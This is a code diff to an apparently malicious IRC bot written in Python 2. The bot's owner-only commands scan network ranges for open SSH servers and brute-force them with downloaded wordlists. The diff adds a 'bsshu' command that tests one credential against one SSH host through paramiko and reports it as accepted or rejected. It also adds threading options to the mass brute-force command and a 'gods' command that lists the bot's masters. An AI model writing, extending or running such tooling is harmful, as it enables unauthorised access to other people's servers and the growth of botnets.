@@ -22,6 +22,7 @@ class Bot:
 	CMDS = [
 		'help',
 		'power',
+		'gods',
 		'nick',
 		'join',
 		'jobs',
@@ -31,6 +32,7 @@ class Bot:
 		'proxy',
 		'ssh',
 		'nssh',
+		'bsshu',
 		'bssh',
 		#'summoner',
 		#'rank',
@@ -41,6 +43,7 @@ class Bot:
 
 	USAGE = {
 		'power': 'power [nickname] # gives power to {nickname} (admin-only).',
+		'gods': 'gods # show who i serve.',
 		'nick': 'nick [nickname] # change nickname (admin-only).',
 		'join': 'join [channel] # join channel (admin-only).',
 		'jobs': 'jobs # show all runnning jobs.',
@@ -50,7 +53,8 @@ class Bot:
 		'proxy': 'proxy [URL] # check for all proxies in URL (text file with proxies).',
 		'ssh': 'ssh [net] # scan for open sshs in net (e.g. 200.100.100).',
 		'nssh': 'nssh # show the number of open sshs currently stored.',
-		'bssh': 'bssh [URL] # brute force stored open sshs with {URL} wordlist.',
+		'bsshu': 'bsshu [ssh] [key] # brute force {ssh} with given {key}.',
+		'bssh': 'bssh [URL] [keys_per_thread] # brute force stored open sshs with {URL} wordlist and {keys_per_thread}.',
 		#'summoner': 'summoner [summoner_name] # show {summoner_name} data.',
 		#'rank': 'rank [summoner_name] # show {summoner_name} rank data.',
 		#'last': 'last [summoner_name] # show {summoner_name} last game data.',
@@ -267,6 +271,19 @@ class Bot:
 			except Exception, e:
 				self.printayne(e, [place])
 				self.printayne('error downloading ssh list file', [place])
+
+		if (cmd == 'bsshu'):
+			if not self.check_owner(source, place):
+				return
+			if not self.check_args(args, 2, place):
+				return
+
+			ssh_cli = paramiko.SSHClient()
+			ssh_cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+			if self.bssh_u(ssh_cli, args[0], args[1]):
+				self.printayne('ssh {0} key {1} ACCEPTED'.format(args[0], args[1]), [place])
+			else:
+				self.printayne('ssh {0} key {1} REJECTED'.format(args[0], args[1]), [place])
 
 		if (cmd == 'bssh'):
 			if not self.check_owner(source, place):
